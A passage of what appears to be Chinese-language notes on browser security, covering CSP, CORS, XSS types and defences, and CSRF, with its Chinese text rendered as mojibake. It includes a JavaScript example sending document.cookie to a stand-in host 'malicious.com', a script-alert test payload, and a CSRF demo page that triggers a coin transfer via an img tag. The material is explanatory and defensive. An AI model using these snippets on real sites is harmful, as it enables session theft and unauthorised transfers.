é¡µé¢ä¸­å¯ä»¥åµŒå…¥ç¬¬ä¸‰æ–¹èµ„æº</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">onClick</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> url = <span class="string">`http://malicious.com?cookie = <span class="subst">$&#123;<span class="built_in">document</span>.cookie&#125;</span>`</span></span><br><span class="line">  open(url)</span><br><span class="line">&#125;</span><br><span class="line">onClick()</span><br></pre></td></tr></table></figure><p>åœ¨è¿™æ®µä»£ç ä¸­ï¼Œæ¶æ„è„šæœ¬è¯»å– Cookie æ•°æ®ï¼Œå¹¶å°†å…¶ä½œä¸ºå‚æ•°æ·»åŠ è‡³æ¶æ„ç«™ç‚¹å°¾éƒ¨ï¼Œå½“æ‰“å¼€è¯¥æ¶æ„é¡µé¢æ—¶ï¼Œæ¶æ„æœåŠ¡å™¨å°±èƒ½æ¥æ”¶åˆ°å½“å‰ç”¨æˆ·çš„ Cookie ä¿¡æ¯ã€‚</p><p>ä»¥ä¸Šå°±æ˜¯ä¸€ä¸ªéå¸¸å…¸å‹çš„ XSS æ”»å‡»ã€‚ä¸ºäº†è§£å†³ XSS æ”»å‡»ï¼Œæµè§ˆå™¨ä¸­å¼•å…¥äº†å†…å®¹å®‰å…¨ç­–ç•¥ï¼Œç§°ä¸º CSPã€‚<strong>CSP çš„æ ¸å¿ƒæ€æƒ³æ˜¯è®©æœåŠ¡å™¨å†³å®šæµè§ˆå™¨èƒ½å¤ŸåŠ è½½å“ªäº›èµ„æºï¼Œè®©æœåŠ¡å™¨å†³å®šæµè§ˆå™¨æ˜¯å¦èƒ½å¤Ÿæ‰§è¡Œå†…è” JavaScript ä»£ç </strong>ã€‚é€šè¿‡è¿™äº›æ‰‹æ®µå°±å¯ä»¥å¤§å¤§å‡å°‘ XSS æ”»å‡»ã€‚</p><h4 id="2-è·¨åŸŸèµ„æºå…±äº«å’Œè·¨æ–‡æ¡£æ¶ˆæ¯æœºåˆ¶"><a href="#2-è·¨åŸŸèµ„æºå…±äº«å’Œè·¨æ–‡æ¡£æ¶ˆæ¯æœºåˆ¶" class="headerlink" title="2. è·¨åŸŸèµ„æºå…±äº«å’Œè·¨æ–‡æ¡£æ¶ˆæ¯æœºåˆ¶"></a>2. è·¨åŸŸèµ„æºå…±äº«å’Œè·¨æ–‡æ¡£æ¶ˆæ¯æœºåˆ¶</h4><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœæ‰“å¼€æå®¢é‚¦çš„å®˜ç½‘é¡µé¢ï¼Œåœ¨å®˜ç½‘é¡µé¢ä¸­é€šè¿‡ XMLHttpRequest æˆ–è€… Fetch æ¥è¯·æ±‚ InfoQ ä¸­çš„èµ„æºï¼Œè¿™æ—¶åŒæºç­–ç•¥ä¼šé˜»æ­¢å…¶å‘ InfoQ å‘å‡ºè¯·æ±‚ï¼Œè¿™æ ·ä¼šå¤§å¤§åˆ¶çº¦æˆ‘ä»¬çš„ç”Ÿäº§åŠ›ã€‚</p><p>ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¼•å…¥äº†<strong>è·¨åŸŸèµ„æºå…±äº«ï¼ˆCORSï¼‰</strong>ï¼Œä½¿ç”¨è¯¥æœºåˆ¶å¯ä»¥è¿›è¡Œè·¨åŸŸè®¿é—®æ§åˆ¶ï¼Œä»è€Œä½¿è·¨åŸŸæ•°æ®ä¼ è¾“å¾—ä»¥å®‰å…¨è¿›è¡Œã€‚</p><p>åœ¨ä»‹ç»åŒæºç­–ç•¥æ—¶ï¼Œæˆ‘ä»¬è¯´æ˜äº†å¦‚æœä¸¤ä¸ªé¡µé¢ä¸æ˜¯åŒæºçš„ï¼Œåˆ™æ— æ³•ç›¸äº’æ“çºµ DOMã€‚ä¸è¿‡åœ¨å®é™…åº”ç”¨ä¸­ï¼Œç»å¸¸éœ€è¦ä¸¤ä¸ªä¸åŒæºçš„ DOM ä¹‹é—´è¿›è¡Œé€šä¿¡ï¼Œäºæ˜¯æµè§ˆå™¨ä¸­åˆå¼•å…¥äº†<strong>è·¨æ–‡æ¡£æ¶ˆæ¯æœºåˆ¶</strong>ï¼Œå¯ä»¥é€šè¿‡ window.postMessage çš„ JavaScript æ¥å£æ¥å’Œä¸åŒæºçš„ DOM è¿›è¡Œé€šä¿¡ã€‚</p><h2 id="è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ï¼šä¸ºä»€ä¹ˆCookieä¸­æœ‰HttpOnlyå±æ€§ï¼Ÿ"><a href="#è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ï¼šä¸ºä»€ä¹ˆCookieä¸­æœ‰HttpOnlyå±æ€§ï¼Ÿ" class="headerlink" title="è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ï¼šä¸ºä»€ä¹ˆCookieä¸­æœ‰HttpOnlyå±æ€§ï¼Ÿ"></a>è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ï¼šä¸ºä»€ä¹ˆCookieä¸­æœ‰HttpOnlyå±æ€§ï¼Ÿ</h2><h3 id="ä»€ä¹ˆæ˜¯-XSS-æ”»å‡»"><a href="#ä»€ä¹ˆæ˜¯-XSS-æ”»å‡»" class="headerlink" title="ä»€ä¹ˆæ˜¯ XSS æ”»å‡»"></a>ä»€ä¹ˆæ˜¯ XSS æ”»å‡»</h3><p>XSS å…¨ç§°æ˜¯ Cross Site Scriptingï¼Œä¸ºäº†ä¸â€œCSSâ€åŒºåˆ†å¼€æ¥ï¼Œæ•…ç®€ç§° XSSï¼Œç¿»è¯‘è¿‡æ¥å°±æ˜¯â€œè·¨ç«™è„šæœ¬â€ã€‚XSS æ”»å‡»æ˜¯æŒ‡é»‘å®¢å¾€ HTML æ–‡ä»¶ä¸­æˆ–è€… DOM ä¸­æ³¨å…¥æ¶æ„è„šæœ¬ï¼Œä»è€Œåœ¨ç”¨æˆ·æµè§ˆé¡µé¢æ—¶åˆ©ç”¨æ³¨å…¥çš„æ¶æ„è„šæœ¬å¯¹ç”¨æˆ·å®æ–½æ”»å‡»çš„ä¸€ç§æ‰‹æ®µã€‚</p><p>å½“é¡µé¢è¢«æ³¨å…¥äº†æ¶æ„ JavaScript è„šæœ¬æ—¶ï¼Œæµè§ˆå™¨æ— æ³•åŒºåˆ†è¿™äº›è„šæœ¬æ˜¯è¢«æ¶æ„æ³¨å…¥çš„è¿˜æ˜¯æ­£å¸¸çš„é¡µé¢å†…å®¹ï¼Œæ‰€ä»¥æ¶æ„æ³¨å…¥ JavaScript è„šæœ¬ä¹Ÿæ‹¥æœ‰æ‰€æœ‰çš„è„šæœ¬æƒé™ã€‚</p><ul><li>å¯ä»¥<strong>çªƒå– Cookie ä¿¡æ¯</strong>ã€‚æ¶æ„ JavaScript å¯ä»¥é€šè¿‡â€œdocument.cookieâ€è·å– Cookie ä¿¡æ¯ï¼Œç„¶åé€šè¿‡ XMLHttpRequest æˆ–è€… Fetch åŠ ä¸Š CORS åŠŸèƒ½å°†æ•°æ®å‘é€ç»™æ¶æ„æœåŠ¡å™¨ï¼›æ¶æ„æœåŠ¡å™¨æ‹¿åˆ°ç”¨æˆ·çš„ Cookie ä¿¡æ¯ä¹‹åï¼Œå°±å¯ä»¥åœ¨å…¶ä»–ç”µè„‘ä¸Šæ¨¡æ‹Ÿç”¨æˆ·çš„ç™»å½•ï¼Œç„¶åè¿›è¡Œè½¬è´¦ç­‰æ“ä½œã€‚</li><li>å¯ä»¥<strong>ç›‘å¬ç”¨æˆ·è¡Œä¸º</strong>ã€‚æ¶æ„ JavaScript å¯ä»¥ä½¿ç”¨â€œaddEventListenerâ€æ¥å£æ¥ç›‘å¬é”®ç›˜äº‹ä»¶ï¼Œæ¯”å¦‚å¯ä»¥è·å–ç”¨æˆ·è¾“å…¥çš„ä¿¡ç”¨å¡ç­‰ä¿¡æ¯ï¼Œå°†å…¶å‘é€åˆ°æ¶æ„æœåŠ¡å™¨ã€‚é»‘å®¢æŒæ¡äº†è¿™äº›ä¿¡æ¯ä¹‹åï¼Œåˆå¯ä»¥åšå¾ˆå¤šè¿æ³•çš„äº‹æƒ…ã€‚</li><li>å¯ä»¥é€šè¿‡<strong>ä¿®æ”¹ DOM</strong>ä¼ªé€ å‡çš„ç™»å½•çª—å£ï¼Œç”¨æ¥æ¬ºéª—ç”¨æˆ·è¾“å…¥ç”¨æˆ·åå’Œå¯†ç ç­‰ä¿¡æ¯ã€‚</li><li>è¿˜å¯ä»¥<strong>åœ¨é¡µé¢å†…ç”Ÿæˆæµ®çª—å¹¿å‘Š</strong>ï¼Œè¿™äº›å¹¿å‘Šä¼šä¸¥é‡åœ°å½±å“ç”¨æˆ·ä½“éªŒã€‚</li></ul><h3 id="æ¶æ„è„šæœ¬æ˜¯æ€ä¹ˆæ³¨å…¥çš„"><a href="#æ¶æ„è„šæœ¬æ˜¯æ€ä¹ˆæ³¨å…¥çš„" class="headerlink" title="æ¶æ„è„šæœ¬æ˜¯æ€ä¹ˆæ³¨å…¥çš„"></a>æ¶æ„è„šæœ¬æ˜¯æ€ä¹ˆæ³¨å…¥çš„</h3><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œä¸»è¦æœ‰<strong>å­˜å‚¨å‹ XSS æ”»å‡»ã€åå°„å‹ XSS æ”»å‡»</strong>å’Œ<strong>åŸºäº DOM çš„ XSS æ”»å‡»</strong>ä¸‰ç§æ–¹å¼æ¥æ³¨å…¥æ¶æ„è„šæœ¬ã€‚</p><h4 id="1-å­˜å‚¨å‹-XSS-æ”»å‡»"><a href="#1-å­˜å‚¨å‹-XSS-æ”»å‡»" class="headerlink" title="1. å­˜å‚¨å‹ XSS æ”»å‡»"></a>1. å­˜å‚¨å‹ XSS æ”»å‡»</h4><p>å¤§è‡´éœ€è¦ç»è¿‡å¦‚ä¸‹æ­¥éª¤ï¼š</p><ul><li>é¦–å…ˆé»‘å®¢åˆ©ç”¨ç«™ç‚¹æ¼æ´å°†ä¸€æ®µæ¶æ„ JavaScript ä»£ç æäº¤åˆ°ç½‘ç«™çš„æ•°æ®åº“ä¸­ï¼›</li><li>ç„¶åç”¨æˆ·å‘ç½‘ç«™è¯·æ±‚åŒ…å«äº†æ¶æ„ JavaScript è„šæœ¬çš„é¡µé¢ï¼›</li><li>å½“ç”¨æˆ·æµè§ˆè¯¥é¡µé¢çš„æ—¶å€™ï¼Œæ¶æ„è„šæœ¬å°±ä¼šå°†ç”¨æˆ·çš„ Cookie ä¿¡æ¯ç­‰æ•°æ®ä¸Šä¼ åˆ°æœåŠ¡å™¨ã€‚</li></ul><h4 id="2-åå°„å‹-XSS-æ”»å‡»"><a href="#2-åå°„å‹-XSS-æ”»å‡»" class="headerlink" title="2. åå°„å‹ XSS æ”»å‡»"></a>2. åå°„å‹ XSS æ”»å‡»</h4><p>åœ¨ä¸€ä¸ªåå°„å‹ XSS æ”»å‡»è¿‡ç¨‹ä¸­ï¼Œæ¶æ„ JavaScript è„šæœ¬å±äºç”¨æˆ·å‘é€ç»™ç½‘ç«™è¯·æ±‚ä¸­çš„ä¸€éƒ¨åˆ†ï¼Œéšåç½‘ç«™åˆæŠŠæ¶æ„ JavaScript è„šæœ¬è¿”å›ç»™ç”¨æˆ·ã€‚å½“æ¶æ„ JavaScript è„šæœ¬åœ¨ç”¨æˆ·é¡µé¢ä¸­è¢«æ‰§è¡Œæ—¶ï¼Œé»‘å®¢å°±å¯ä»¥åˆ©ç”¨è¯¥è„šæœ¬åšä¸€äº›æ¶æ„æ“ä½œã€‚<strong>Web æœåŠ¡å™¨ä¸ä¼šå­˜å‚¨åå°„å‹ XSS æ”»å‡»çš„æ¶æ„è„šæœ¬ï¼Œè¿™æ˜¯å’Œå­˜å‚¨å‹ XSS æ”»å‡»ä¸åŒçš„åœ°æ–¹</strong>ã€‚</p><h4 id="3-åŸºäº-DOM-çš„-XSS-æ”»å‡»"><a href="#3-åŸºäº-DOM-çš„-XSS-æ”»å‡»" class="headerlink" title="3. åŸºäº DOM çš„ XSS æ”»å‡»"></a>3. åŸºäº DOM çš„ XSS æ”»å‡»</h4><p>åŸºäº DOM çš„ XSS æ”»å‡»æ˜¯ä¸ç‰µæ¶‰åˆ°é¡µé¢ Web æœåŠ¡å™¨çš„ã€‚å…·ä½“æ¥è®²ï¼Œé»‘å®¢é€šè¿‡å„ç§æ‰‹æ®µå°†æ¶æ„è„šæœ¬æ³¨å…¥ç”¨æˆ·çš„é¡µé¢ä¸­ï¼Œæ¯”å¦‚é€šè¿‡ç½‘ç»œåŠ«æŒåœ¨é¡µé¢ä¼ è¾“è¿‡ç¨‹ä¸­ä¿®æ”¹ HTML é¡µé¢çš„å†…å®¹ï¼Œè¿™ç§åŠ«æŒç±»å‹å¾ˆå¤šï¼Œæœ‰é€šè¿‡ WiFi è·¯ç”±å™¨åŠ«æŒçš„ï¼Œæœ‰é€šè¿‡æœ¬åœ°æ¶æ„è½¯ä»¶æ¥åŠ«æŒçš„ï¼Œå®ƒä»¬çš„å…±åŒç‚¹æ˜¯åœ¨ Web èµ„æºä¼ è¾“è¿‡ç¨‹æˆ–è€…åœ¨ç”¨æˆ·ä½¿ç”¨é¡µé¢çš„è¿‡ç¨‹ä¸­ä¿®æ”¹ Web é¡µé¢çš„æ•°æ®ã€‚</p><h3 id="å¦‚ä½•é˜»æ­¢-XSS-æ”»å‡»"><a href="#å¦‚ä½•é˜»æ­¢-XSS-æ”»å‡»" class="headerlink" title="å¦‚ä½•é˜»æ­¢ XSS æ”»å‡»"></a>å¦‚ä½•é˜»æ­¢ XSS æ”»å‡»</h3><p>å­˜å‚¨å‹ XSS æ”»å‡»å’Œåå°„å‹ XSS æ”»å‡»æ˜¯æœåŠ¡ç«¯çš„å®‰å…¨æ¼æ´ï¼ŒåŸºäº DOM çš„ XSS æ”»å‡»æ˜¯å±äºå‰ç«¯çš„å®‰å…¨æ¼æ´ã€‚å®ƒä»¬éƒ½æœ‰ä¸€ä¸ªå…±åŒç‚¹ï¼Œé‚£å°±æ˜¯<strong>é¦–å…ˆå¾€æµè§ˆå™¨ä¸­æ³¨å…¥æ¶æ„è„šæœ¬ï¼Œç„¶åå†é€šè¿‡æ¶æ„è„šæœ¬å°†ç”¨æˆ·ä¿¡æ¯å‘é€è‡³é»‘å®¢éƒ¨ç½²çš„æ¶æ„æœåŠ¡å™¨ä¸Šã€‚</strong></p><p>æ‰€ä»¥è¦é˜»æ­¢ XSS æ”»å‡»ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡é˜»æ­¢æ¶æ„ JavaScript è„šæœ¬çš„æ³¨å…¥å’Œæ¶æ„æ¶ˆæ¯çš„å‘é€æ¥å®ç°ã€‚</p><h4 id="1-æœåŠ¡å™¨å¯¹è¾“å…¥è„šæœ¬è¿›è¡Œè¿‡æ»¤æˆ–è½¬ç "><a href="#1-æœåŠ¡å™¨å¯¹è¾“å…¥è„šæœ¬è¿›è¡Œè¿‡æ»¤æˆ–è½¬ç " class="headerlink" title="1. æœåŠ¡å™¨å¯¹è¾“å…¥è„šæœ¬è¿›è¡Œè¿‡æ»¤æˆ–è½¬ç "></a>1. æœåŠ¡å™¨å¯¹è¾“å…¥è„šæœ¬è¿›è¡Œè¿‡æ»¤æˆ–è½¬ç </h4><p>ä¸ç®¡æ˜¯åå°„å‹è¿˜æ˜¯å­˜å‚¨å‹ XSS æ”»å‡»ï¼Œæˆ‘ä»¬éƒ½å¯ä»¥åœ¨æœåŠ¡å™¨ç«¯å°†ä¸€äº›å…³é”®çš„å­—ç¬¦è¿›è¡Œè½¬ç ï¼Œæ¯”å¦‚æœ€å…¸å‹çš„ï¼š<code>code:&lt;script&gt;alert(&#39;ä½ è¢« xss æ”»å‡»äº†&#39;)&lt;/script&gt;</code> è¿™æ®µä»£ç è¿‡æ»¤åï¼Œåªç•™ä¸‹äº†ï¼š<code>code:</code> è¿™æ ·ï¼Œå½“ç”¨æˆ·å†æ¬¡è¯·æ±‚è¯¥é¡µé¢æ—¶ï¼Œç”±äº``æ ‡ç­¾çš„å†…å®¹éƒ½è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥è¿™æ®µè„šæœ¬åœ¨å®¢æˆ·ç«¯æ˜¯ä¸å¯èƒ½è¢«æ‰§è¡Œçš„ã€‚</p><p>é™¤äº†è¿‡æ»¤ä¹‹å¤–ï¼ŒæœåŠ¡å™¨è¿˜å¯ä»¥å¯¹è¿™äº›å†…å®¹è¿›è¡Œè½¬ç ï¼Œè¿˜æ˜¯ä¸Šé¢é‚£æ®µä»£ç ï¼Œç»è¿‡è½¬ç ä¹‹åï¼Œæ•ˆæœå¦‚ä¸‹æ‰€ç¤ºï¼š<code>code:&amp;lt;script&amp;gt;alert(&amp;#39; ä½ è¢« xss æ”»å‡»äº† &amp;#39;)&amp;lt;/script&amp;gt;</code> ç»è¿‡è½¬ç ä¹‹åçš„å†…å®¹ï¼Œå¦‚``æ ‡ç­¾è¢«è½¬æ¢ä¸º<code>&lt;script&gt;</code>ï¼Œå› æ­¤å³ä½¿è¿™æ®µè„šæœ¬è¿”å›ç»™é¡µé¢ï¼Œé¡µé¢ä¹Ÿä¸ä¼šæ‰§è¡Œè¿™æ®µè„šæœ¬ã€‚</p><h4 id="2-å……åˆ†åˆ©ç”¨-CSP"><a href="#2-å……åˆ†åˆ©ç”¨-CSP" class="headerlink" title="2. å……åˆ†åˆ©ç”¨ CSP"></a>2. å……åˆ†åˆ©ç”¨ CSP</h4><p>å®æ–½ä¸¥æ ¼çš„ CSP å¯ä»¥æœ‰æ•ˆåœ°é˜²èŒƒ XSS æ”»å‡»ï¼Œå…·ä½“æ¥è®² CSP æœ‰å¦‚ä¸‹å‡ ä¸ªåŠŸèƒ½ï¼š</p><ul><li>é™åˆ¶åŠ è½½å…¶ä»–åŸŸä¸‹çš„èµ„æºæ–‡ä»¶ï¼Œè¿™æ ·å³ä½¿é»‘å®¢æ’å…¥äº†ä¸€ä¸ª JavaScript æ–‡ä»¶ï¼Œè¿™ä¸ª JavaScript æ–‡ä»¶ä¹Ÿæ˜¯æ— æ³•è¢«åŠ è½½çš„ï¼›</li><li>ç¦æ­¢å‘ç¬¬ä¸‰æ–¹åŸŸæäº¤æ•°æ®ï¼Œè¿™æ ·ç”¨æˆ·æ•°æ®ä¹Ÿä¸ä¼šå¤–æ³„ï¼›</li><li>ç¦æ­¢æ‰§è¡Œå†…è”è„šæœ¬å’Œæœªæˆæƒçš„è„šæœ¬ï¼›</li><li>è¿˜æä¾›äº†ä¸ŠæŠ¥æœºåˆ¶ï¼Œè¿™æ ·å¯ä»¥å¸®åŠ©æˆ‘ä»¬å°½å¿«å‘ç°æœ‰å“ªäº› XSS æ”»å‡»ï¼Œä»¥ä¾¿å°½å¿«ä¿®å¤é—®é¢˜ã€‚</li></ul><h4 id="3-ä½¿ç”¨-HttpOnly-å±æ€§"><a href="#3-ä½¿ç”¨-HttpOnly-å±æ€§" class="headerlink" title="3. ä½¿ç”¨ HttpOnly å±æ€§"></a>3. ä½¿ç”¨ HttpOnly å±æ€§</h4><p>ç”±äºå¾ˆå¤š XSS æ”»å‡»éƒ½æ˜¯æ¥ç›—ç”¨ Cookie çš„ï¼Œå› æ­¤è¿˜å¯ä»¥é€šè¿‡ä½¿ç”¨ HttpOnly å±æ€§æ¥ä¿æŠ¤æˆ‘ä»¬ Cookie çš„å®‰å…¨ã€‚é€šå¸¸æœåŠ¡å™¨å¯ä»¥å°†æŸäº› Cookie è®¾ç½®ä¸º HttpOnly æ ‡å¿—ï¼ŒHttpOnly æ˜¯æœåŠ¡å™¨é€šè¿‡ HTTP å“åº”å¤´æ¥è®¾ç½®çš„ã€‚</p><p>ä½¿ç”¨ HttpOnly æ ‡è®°çš„ Cookie åªèƒ½ä½¿ç”¨åœ¨ HTTP è¯·æ±‚è¿‡ç¨‹ä¸­ï¼Œæ‰€ä»¥æ— æ³•é€šè¿‡ JavaScript æ¥è¯»å–è¿™æ®µ Cookieã€‚</p><p>ç”±äº JavaScript æ— æ³•è¯»å–è®¾ç½®äº† HttpOnly çš„ Cookie æ•°æ®ï¼Œæ‰€ä»¥å³ä½¿é¡µé¢è¢«æ³¨å…¥äº†æ¶æ„ JavaScript è„šæœ¬ï¼Œä¹Ÿæ˜¯æ— æ³•è·å–åˆ°è®¾ç½®äº† HttpOnly çš„æ•°æ®ã€‚å› æ­¤ä¸€äº›æ¯”è¾ƒé‡è¦çš„æ•°æ®æˆ‘ä»¬å»ºè®®è®¾ç½® HttpOnly æ ‡å¿—ã€‚</p><h2 id="CSRFæ”»å‡»ï¼šé™Œç”Ÿé“¾æ¥ä¸è¦éšä¾¿ç‚¹"><a href="#CSRFæ”»å‡»ï¼šé™Œç”Ÿé“¾æ¥ä¸è¦éšä¾¿ç‚¹" class="headerlink" title="CSRFæ”»å‡»ï¼šé™Œç”Ÿé“¾æ¥ä¸è¦éšä¾¿ç‚¹"></a>CSRFæ”»å‡»ï¼šé™Œç”Ÿé“¾æ¥ä¸è¦éšä¾¿ç‚¹</h2><h3 id="ä»€ä¹ˆæ˜¯-CSRF-æ”»å‡»"><a href="#ä»€ä¹ˆæ˜¯-CSRF-æ”»å‡»" class="headerlink" title="ä»€ä¹ˆæ˜¯ CSRF æ”»å‡»"></a>ä»€ä¹ˆæ˜¯ CSRF æ”»å‡»</h3><p>CSRF è‹±æ–‡å…¨ç§°æ˜¯ Cross-site request forgeryï¼Œæ‰€ä»¥åˆç§°ä¸ºâ€œè·¨ç«™è¯·æ±‚ä¼ªé€ â€ï¼Œæ˜¯æŒ‡é»‘å®¢ å¼•è¯±ç”¨æˆ·æ‰“å¼€é»‘å®¢çš„ç½‘ç«™ï¼Œåœ¨é»‘å®¢çš„ç½‘ç«™ä¸­ï¼Œåˆ©ç”¨ç”¨æˆ·çš„ç™»å½•çŠ¶æ€å‘èµ·çš„è·¨ç«™è¯·æ±‚ã€‚ç®€å•æ¥ è®²ï¼Œ<strong>CSRF æ”»å‡»å°±æ˜¯é»‘å®¢åˆ©ç”¨äº†ç”¨æˆ·çš„ç™»å½•çŠ¶æ€ï¼Œå¹¶é€šè¿‡ç¬¬ä¸‰æ–¹çš„ç«™ç‚¹æ¥åšä¸€äº›åäº‹ã€‚</strong></p><h4 id="1-è‡ªåŠ¨å‘èµ·-Get-è¯·æ±‚"><a href="#1-è‡ªåŠ¨å‘èµ·-Get-è¯·æ±‚" class="headerlink" title="1. è‡ªåŠ¨å‘èµ· Get è¯·æ±‚"></a>1. è‡ªåŠ¨å‘èµ· Get è¯·æ±‚</h4><p>é»‘å®¢æœ€å®¹æ˜“å®æ–½çš„æ”»å‡»æ–¹å¼æ˜¯è‡ªåŠ¨å‘èµ· Get è¯·æ±‚ï¼Œå…·ä½“æ”»å‡»æ–¹å¼ä½ å¯ä»¥å‚è€ƒä¸‹é¢è¿™æ®µä»£ç ï¼š</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span> é»‘å®¢çš„ç«™ç‚¹ï¼šCSRF æ”»å‡»æ¼”ç¤º <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://time.geekbang.org/sendcoin?user=hacker&amp;number=100&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™æ˜¯é»‘å®¢é¡µé¢çš„ HTML ä»£ç ï¼Œåœ¨è¿™æ®µä»£ç ä¸­ï¼Œé»‘å®¢å°†è½¬è´¦çš„è¯·æ±‚æ¥å£éšè—åœ¨ img æ ‡ç­¾å†…ï¼Œ æ¬ºéª—æµè§ˆå™¨è¿™æ˜¯ä¸€å¼ å›¾ç‰‡èµ„æºã€‚å½“è¯¥é¡µé¢è¢«åŠ è½½æ—¶ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨å‘èµ· img çš„èµ„æºè¯·æ±‚ï¼Œå¦‚æœæœåŠ¡å™¨æ²¡æœ‰å¯¹è¯¥è¯·æ±‚åšåˆ¤æ–­çš„è¯ï¼Œé‚£ä¹ˆæœåŠ¡å™¨å°±ä¼šè®¤ä¸ºè¯¥è¯·æ±‚æ˜¯ä¸€ä¸ªè½¬è´¦è¯·æ±‚ï¼Œäºæ˜¯ç”¨ æˆ·è´¦æˆ·ä¸Šçš„ 100 æå®¢å¸å°±è¢«è½¬ç§»åˆ°é»‘å®¢çš„è´¦æˆ·ä¸Šå»äº†ã€‚</p><h4 id="2-è‡ªåŠ¨å‘èµ·-POST-è¯·æ±‚"><a href="#2-è‡ªåŠ¨å‘èµ·-POST-è¯·æ±‚" class="headerlink" title="2. è‡ªåŠ¨å‘èµ· POST è¯·æ±‚"></a>2. è‡ªåŠ¨å‘èµ· POST è¯·æ±‚</h4><p><img src="https://i.loli.net/2021/06/15/TirZDxqEkoaK6tu.jpg" alt="Snipaste_2021-06-15_16-05-09.jpg"></p><p>åœ¨è¿™æ®µä»£ç ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°é»‘å®¢åœ¨ä»–çš„é¡µé¢ä¸­æ„å»ºäº†ä¸€ä¸ªéšè—çš„è¡¨å•ï¼Œè¯¥è¡¨å•çš„å†…å®¹å°±æ˜¯ æå®¢æ—¶é—´çš„è½¬è´¦æ¥å£ã€‚å½“ç”¨æˆ·æ‰“å¼€è¯¥ç«™ç‚¹ä¹‹åï¼Œè¿™ä¸ªè¡¨å•ä¼šè¢«è‡ªåŠ¨æ‰§è¡Œæäº¤ï¼›å½“è¡¨å•è¢«æäº¤ ä¹‹åï¼ŒæœåŠ¡å™¨å°±ä¼šæ‰§è¡Œè½¬è´¦æ“ä½œã€‚å› æ­¤ä½¿ç”¨æ„å»ºè‡ªåŠ¨æäº¤è¡¨å•è¿™ç§æ–¹å¼ï¼Œå°±å¯ä»¥è‡ªåŠ¨å®ç°è·¨ ç«™ç‚¹ POST æ•°æ®æäº¤ã€‚</p><h4 id="3-å¼•è¯±ç”¨æˆ·ç‚¹å‡»é“¾æ¥"><a href="#3-å¼•è¯±ç”¨æˆ·ç‚¹å‡»é“¾æ¥" class="headerlink" title="3. å¼•è¯±ç”¨æˆ·ç‚¹å‡»é“¾æ¥"></a>3. å¼•è¯±ç”¨æˆ·ç‚¹å‡»é“¾æ¥</h4><p><strong>å’Œ XSS ä¸åŒçš„æ˜¯ï¼ŒCSRF æ”»å‡»ä¸éœ€è¦å°†æ¶ æ„ä»£ç æ³¨å…¥ç”¨æˆ·çš„é¡µé¢ï¼Œä»…ä»…æ˜¯åˆ©ç”¨æœåŠ¡å™¨çš„æ¼æ´å’Œç”¨æˆ·çš„ç™»å½•çŠ¶æ€æ¥å®æ–½æ”»å‡»ã€‚</strong></p><h3 id="å¦‚ä½•é˜²æ­¢-CSRF-æ”»å‡»"><a href="#å¦‚ä½•é˜²æ­¢-CSRF-æ”»å‡»" class="headerlink" title="å¦‚ä½•é˜²æ­¢ CSRF æ”»å‡»"></a>å¦‚ä½•é˜²æ­¢ CSRF æ”»å‡»</h3><p>å‘èµ· CSRF æ”»å‡»çš„ä¸‰ä¸ªå¿…è¦æ¡ ä»¶ï¼š</p><ul><li>ç¬¬ä¸€ä¸ªï¼Œç›®æ ‡ç«™ç‚¹ä¸€å®šè¦æœ‰ CSRF æ¼æ´ï¼› </li><li>ç¬¬äºŒä¸ªï¼Œç”¨æˆ·è¦ç™»å½•è¿‡ç›®æ ‡ç«™ç‚¹ï¼Œå¹¶ä¸”åœ¨æµè§ˆå™¨ä¸Šä¿æŒæœ‰è¯¥ç«™ç‚¹çš„ç™»å½•çŠ¶æ€ï¼› </li><li>ç¬¬ä¸‰ä¸ªï¼Œéœ€è¦ç”¨æˆ·æ‰“å¼€ä¸€ä¸ªç¬¬ä¸‰æ–¹ç«™ç‚¹ï¼Œå¯ä»¥æ˜¯é»‘å®¢çš„ç«™ç‚¹ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€äº›è®ºå›ã€‚</li></ul><p>ä¸ XSS æ”»å‡»ä¸åŒï¼ŒCSRF æ”»å‡»ä¸ä¼šå¾€é¡µé¢æ³¨å…¥æ¶æ„è„šæœ¬ï¼Œå› æ­¤é»‘å®¢æ˜¯æ— æ³•é€šè¿‡ CSRF æ”»å‡»æ¥è·å–ç”¨æˆ·é¡µé¢æ•°æ®çš„ï¼›å…¶æœ€å…³é”®çš„ä¸€ç‚¹æ˜¯è¦èƒ½æ‰¾åˆ°æœåŠ¡å™¨çš„æ¼æ´ï¼Œæ‰€ä»¥è¯´å¯¹äº CSRF æ”»å‡»æˆ‘ä»¬ä¸»è¦çš„é˜²æŠ¤æ‰‹æ®µæ˜¯æå‡æœåŠ¡å™¨çš„å®‰å…¨æ€§ã€‚</p><p>æœåŠ¡å™¨é¿å…é­å—åˆ° CSRF æ”»å‡»ï¼Œé€šå¸¸æœ‰ä»¥ä¸‹å‡ ç§é€”å¾„:</p><h4 id="1-å……åˆ†åˆ©ç”¨å¥½-Cookie-çš„-SameSite-å±æ€§"><a href="#1-å……åˆ†åˆ©ç”¨å¥½-Cookie-çš„-SameSite-å±æ€§" 